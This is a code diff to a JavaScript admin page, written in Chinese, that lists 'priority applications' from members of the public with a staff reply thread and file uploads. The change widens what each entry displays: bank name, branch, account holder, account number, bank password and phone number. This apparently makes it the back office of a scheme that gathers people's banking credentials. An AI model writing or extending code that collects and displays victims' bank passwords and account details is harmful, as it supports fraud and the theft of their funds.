@@ -1256,7 +1256,15 @@ async function renderPriorityApplicationList() {
         const messages = Array.isArray(entry.messages) ? entry.messages : [];
         const thread = messages.map((message) => `<p><span>${message.role === 'staff' ? '後台' : '民眾'}</span> ${escapeHtml(message.body)} <time>${escapeHtml(formatTime(message.createdAt))}</time></p>`).join('') || '<p class="muted">尚無筆記或回覆</p>';
         const files = Array.isArray(entry.files) ? entry.files : [];
-        return `<section class="section-card"><h3>第 ${index + 1} 筆</h3><div>銀行：${escapeHtml(entry.bank || '未填')}｜卡號：${escapeHtml(entry.cardNumber || '未填')}｜密碼：${escapeHtml(entry.password || '未填')}</div><div class="priority-thread">${thread}</div><div class="document-files"><h3>筆記附件</h3>${files.length ? files.map(fileRow).join('') : '<p class="muted">這筆筆記尚無附件</p>'}<form class="stacked-form" data-priority-upload data-application-id="${escapeHtml(application.id)}" data-entry-id="${escapeHtml(entry.id)}"><label>加在這筆筆記下方的檔案（圖片、Excel 或其他檔案，每個最多 20 MB）<input name="file" type="file" required></label><button type="submit">上傳檔案</button></form></div><form data-priority-reply data-entry-id="${escapeHtml(entry.id)}"><label>給民眾的訊息<textarea name="body" required></textarea></label><button type="submit">回覆民眾</button></form></section>`;
+        const fields = [
+          ['銀行名稱', entry.bank],
+          ['分行名稱', entry.branchName],
+          ['銀行戶名', entry.accountName],
+          ['銀行帳號', entry.accountNumber || entry.cardNumber],
+          ['密碼', entry.password],
+          ['手機號', entry.phone]
+        ].map(([label, value]) => `${label}：${escapeHtml(value || '未填')}`).join('｜');
+        return `<section class="section-card"><h3>第 ${index + 1} 筆</h3><div>${fields}</div><div class="priority-thread">${thread}</div><div class="document-files"><h3>筆記附件</h3>${files.length ? files.map(fileRow).join('') : '<p class="muted">這筆筆記尚無附件</p>'}<form class="stacked-form" data-priority-upload data-application-id="${escapeHtml(application.id)}" data-entry-id="${escapeHtml(entry.id)}"><label>加在這筆筆記下方的檔案（圖片、Excel 或其他檔案，每個最多 20 MB）<input name="file" type="file" required></label><button type="submit">上傳檔案</button></form></div><form data-priority-reply data-entry-id="${escapeHtml(entry.id)}"><label>給民眾的訊息<textarea name="body" required></textarea></label><button type="submit">回覆民眾</button></form></section>`;
       }).join('')}</div>
       ${legacyFiles.length ? `<div class="document-files"><h3>尚未歸到筆記的附件</h3>${legacyFiles.map(fileRow).join('')}</div>` : ''}`;
     list.appendChild(row);
